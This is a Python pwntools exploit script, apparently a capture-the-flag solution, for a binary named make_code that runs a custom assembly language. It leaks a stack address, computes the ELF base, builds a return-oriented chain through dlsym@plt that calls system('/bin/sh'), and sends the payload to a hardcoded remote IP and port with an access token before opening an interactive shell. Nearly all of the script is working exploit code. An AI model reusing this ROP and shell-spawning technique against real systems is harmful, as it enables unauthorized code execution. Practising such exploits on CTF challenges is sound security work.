from pwn import *

context.log_level = 'debug'

context.aslr = False
base = 0x56555000


io = process('./make_code')
io.recvuntil('\n')

dlsym_plt = 0x06F0
read_plt = 0x0650

puts_got = 0x3028
r0_addr = 0x3054
stack_addr = 0x3050
pop3ret = 0x00000ab8 # pop ebx ; pop esi ; pop ebp ; ret

pop2ret = 0x00000ab9 # pop esi ; pop ebp ; ret
popebxret = 0x0000062d # pop ebx ; ret


call_eax = 0x10B1

# popedxret, edx, dlsym,pop2ret,0,"system", call rax, "/bin/sh" 


code = 'data:\n'
code += '%#x,%#x\n' % (u32('syst'), u32('em\x00\x00'))
code += 'end\n'
code += 'push data\n'
code += 'call puts\n' # save stack address to bss.
code += 'push %#x\n' % (u32('/sh\x00'))
code += 'push %#x\n' % (u32('/bin'))
code += 'mov r1,sp\n' # save sp /bin/sh
code += 'lea r0,r0\n' # get bss addr to r0
code += 'sub r2,r0,0x3054\n' # r2 = elf base address.

code += 'sub r0,r0,0x4\n' # mov r0 to stack_addr. 
code += 'mov sp,r0\n' 

code += 'pop r0\n' # r0 = esp. esp=0xffffd270  ret_addr=0xffffd2dc
code += 'add r0,r0,0x8c\n' # 0x70 will be ret
code += 'mov sp,r0\n' # set sp -> esp

code += 'push r1\n' # /bin/sh
code += 'add r0,r2,0x10B1\n' 
code += 'push r0\n'# call eax
code += 'push data\n' # "system"
code += 'push 0x0\n' # "0"
code += 'add r0,r2,0xab9\n' # pop2ret
code += 'push r0\n'
code += 'add r0,r2,0x6f0\n' # dlsym@plt
#code += 'push 0x5559fe40\n'
code += 'push r0\n'

code += 'add r0,r2,0x3000\n'
code += 'push r0\n'  # restore rbx

code += 'add r0,r2,0x62d\n' # pop ebx,ret
code += 'push r0\n'
code += 'push r0\n'


''' #read, pop3ret, 0, esp, 0x100, [buf]  
code += 'push 0x100\n' # size
code += 'push r0\n' # buf
code += 'push 0x0\n' # stdin fd.
code += 'add r0,r2,0xab8\n' 
code += 'push r0\n'# pop3ret
code += 'add r0,r2,0x650\n' # read@plt
code += 'push r0\n' # will trigger rop. 
code += 'push r0\n' # will trigger rop. 
'''

code += '$\n'


io.sendline(code)
bin_code = io.recv()



#io = process('./pwn')
io = remote('115.28.78.54', 23333)
io.recvuntil('token:')
io.sendline('e8e13ecac1e8f7f9841265963d647ff4tu8uGGdr')

io.recvuntil('give me the bin!')

#gdb.attach(io)

# jmp eax: 0x0C84
# ret: 0xF99
# watch stack, nil, r0, r2
# x/10wx 0x5655804c  
#gdb.attach(io, 'b*%s \nb \'dlsym@plt\''%(hex(base + 0xF99 )))

io.send(bin_code)
io.interactive()